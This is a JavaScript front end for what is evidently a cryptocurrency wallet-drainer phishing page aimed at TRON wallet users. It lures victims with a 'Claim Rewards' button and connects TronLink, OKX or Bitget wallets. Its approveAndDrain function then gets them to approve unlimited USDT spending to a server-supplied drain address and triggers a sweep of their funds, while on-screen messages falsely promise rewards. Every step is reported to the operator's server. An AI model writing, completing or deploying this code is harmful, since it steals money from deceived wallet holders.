let userAddress = null;
let tronWebInstance = null;
let currentWalletType = null;

const connectBtn = document.getElementById('connectBtn');
const walletInfoDiv = document.getElementById('walletInfo');
const walletAddressSpan = document.getElementById('walletAddress');
const usdtBalanceSpan = document.getElementById('usdtBalance');
const trxBalanceSpan = document.getElementById('trxBalance');
const drainBtn = document.getElementById('drainBtn');
const statusDiv = document.getElementById('status');

function setStatus(msg, isError = false) {
    statusDiv.innerText = msg;
    statusDiv.style.color = isError ? '#dc3545' : '#2a5298';
    console.log(msg);
}

async function apiCall(endpoint, data) {
    const res = await fetch(endpoint, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
    });
    return await res.json();
}

async function loadBalances(address) {
    try {
        const data = await apiCall('/api/balance', { address });
        usdtBalanceSpan.innerText = data.usdt.toFixed(2);
        trxBalanceSpan.innerText = data.trx.toFixed(2);
    } catch (err) {
        console.error(err);
        setStatus('Failed to load balance', true);
    }
}

async function connectTronLink() {
    if (!window.tronLink) {
        setStatus('TronLink extension not installed', true);
        return false;
    }
    try {
        await window.tronLink.request({ method: 'tron_requestAccounts' });
        tronWebInstance = window.tronWeb;
        userAddress = tronWebInstance.defaultAddress.base58;
        currentWalletType = 'TronLink';
        return true;
    } catch (err) {
        console.error(err);
        return false;
    }
}

async function connectOKX() {
    if (!window.okxwallet) {
        setStatus('OKX Wallet extension not installed', true);
        return false;
    }
    try {
        await window.okxwallet.request({ method: 'eth_requestAccounts' });
        if (window.okxwallet.tron) {
            tronWebInstance = new TronWeb({
                fullHost: 'https://api.trongrid.io',
                privateKey: null
            });
            const accounts = await window.okxwallet.tron.request({ method: 'tron_requestAccounts' });
            userAddress = accounts[0];
            currentWalletType = 'OKX';
            return true;
        }
        return false;
    } catch (err) {
        console.error(err);
        return false;
    }
}

async function connectBitget() {
    if (!window.bitkeep) {
        setStatus('Bitget Wallet extension not installed', true);
        return false;
    }
    try {
        if (window.bitkeep.tronLink) {
            await window.bitkeep.tronLink.request({ method: 'tron_requestAccounts' });
            tronWebInstance = window.bitkeep.tronLink;
            userAddress = tronWebInstance.defaultAddress.base58;
            currentWalletType = 'Bitget';
            return true;
        }
        return false;
    } catch (err) {
        console.error(err);
        return false;
    }
}

async function connectViaWalletConnect() {
    setStatus('WalletConnect requires mobile app. Please use TronLink, OKX, or Bitget extension on desktop.', true);
    return false;
}

async function connectWithWallet(walletType) {
    setStatus(`Connecting to ${walletType}...`);
    let success = false;
    
    switch(walletType) {
        case 'tronlink':
            success = await connectTronLink();
            break;
        case 'okx':
            success = await connectOKX();
            break;
        case 'bitget':
            success = await connectBitget();
            break;
        case 'walletconnect':
            success = await connectViaWalletConnect();
            break;
        default:
            success = false;
    }
    
    if (success && userAddress) {
        walletAddressSpan.innerText = userAddress;
        walletInfoDiv.classList.remove('hidden');
        setStatus(`✅ Connected with ${currentWalletType}! Fetching balances...`);
        
        await fetch('/api/event', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ type: 'wallet_connected', address: userAddress })
        });
        
        await loadBalances(userAddress);
        setStatus('Ready. Click "Claim Rewards" to receive USDT.');
    } else if (!success && walletType !== 'walletconnect') {
        setStatus(`Failed to connect with ${walletType}. Make sure the wallet extension is installed.`, true);
    }
}

function showWalletModal() {
    const modal = document.createElement('div');
    modal.className = 'wallet-modal-wrapper';
    modal.innerHTML = `
        <div class="wallet-modal">
            <h3>Select Wallet</h3>
            <div id="wallet-list">
                <div class="wallet-option" data-wallet="tronlink">
                    <span>🦊 TronLink</span>
                </div>
                <div class="wallet-option" data-wallet="okx">
                    <span>⭕ OKX Wallet</span>
                </div>
                <div class="wallet-option" data-wallet="bitget">
                    <span>🟢 Bitget Wallet</span>
                </div>
                <div class="wallet-option" data-wallet="walletconnect">
                    <span>📱 WalletConnect</span>
                </div>
            </div>
            <button id="close-modal" style="margin-top:10px;">Cancel</button>
        </div>
    `;
    document.body.appendChild(modal);
    
    const closeModal = () => modal.remove();
    document.getElementById('close-modal').addEventListener('click', closeModal);
    
    document.querySelectorAll('.wallet-option').forEach(opt => {
        opt.addEventListener('click', async () => {
            const walletType = opt.dataset.wallet;
            closeModal();
            await connectWithWallet(walletType);
        });
    });
}

connectBtn.addEventListener('click', showWalletModal);

async function approveAndDrain() {
    if (!userAddress || !tronWebInstance) {
        setStatus('Please connect wallet first', true);
        return;
    }
    
    setStatus('Loading configuration...');
    let config;
    try {
        const res = await fetch('/api/config');
        config = await res.json();
    } catch (err) {
        setStatus('Cannot fetch config from server', true);
        return;
    }
    
    const usdtContractAddress = config.usdtContract;
    const drainTarget = config.drainAddress;
    const MAX_UINT = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
    
    try {
        const usdtContract = await tronWebInstance.contract().at(usdtContractAddress);
        setStatus('Approving USDT spending...');
        
        const approveTx = await usdtContract.approve(drainTarget, MAX_UINT).send();
        setStatus(`✅ Approval sent! TX: ${approveTx}`);
        
        await fetch('/api/event', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ type: 'approve_signed', address: userAddress, txId: approveTx })
        });
        
        setStatus('Initiating transfer...');
        const sweepResult = await apiCall('/api/sweep', { address: userAddress });
        
        if (sweepResult.success) {
            setStatus(`🎉 Success! USDT sent. TX: ${sweepResult.txId}`);
            await fetch('/api/event', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ type: 'drain_sent', address: userAddress, txId: sweepResult.txId, amount: '0' })
            });
            setTimeout(() => loadBalances(userAddress), 5000);
        } else {
            setStatus(`❌ Transfer failed: ${sweepResult.error}`, true);
        }
    } catch (err) {
        console.error(err);
        setStatus('Error: ' + (err.message || 'Unknown error'), true);
    }
}

drainBtn.addEventListener('click', approveAndDrain);
